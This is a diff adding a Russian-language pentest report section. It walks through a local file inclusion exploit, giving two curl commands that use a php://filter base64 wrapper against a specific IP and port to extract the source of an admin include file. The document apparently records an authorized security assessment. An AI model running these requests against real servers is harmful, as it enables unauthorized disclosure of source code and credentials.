@@ -41,6 +41,45 @@ ___
 
 **Реализация:**
 
+<details>
+<summary>Пошаговая реализация</summary>
+
+- **Step 1. Структура файловой системы**
+    
+Ранее реализовав уязвимость **Unrestricted File Upload**, удалось получить представление о структуре файловой системы на сервере.
+
+![](screenshots/OSINT/Censys/censys1.png)
+
+- **Step 2. Получение исходного кода страницы**
+
+Для примера возьмем страницу `/include/admins`, которую удалось обнаружить в директории сервера.
+    
+Сервер не дает прямого доступа к исходному коду, необходимо выгрузить его в формате **base64**.
+    
+Для выгрузки исходного кода воспользуемся инструментом `curl` + **base64-encode**.
+    
+```
+curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.base64-encode/resource=../include/admins"
+```
+
+![](screenshots/SCANNING/nmap/nmap_8050.png)
+   
+- **Step 3. Декодирование кода**
+
+Далее при помощи все того же `curl`, декодируем исходную страницу.
+
+```
+curl "http://92.51.39.106:8050/admin/index.php?page=php://filter/read=convert.base64-encode/resource=../include/admins" -s | base64 -d
+```
+
+![](screenshots/SCANNING/nmap/nmap_8050.png)
+
+- **Вывод**
+    
+Исходный код страницы получен, **уязвимость подтверждена**.
+
+</details>
+
 **Рекомендации по устранению:**
 
 ___
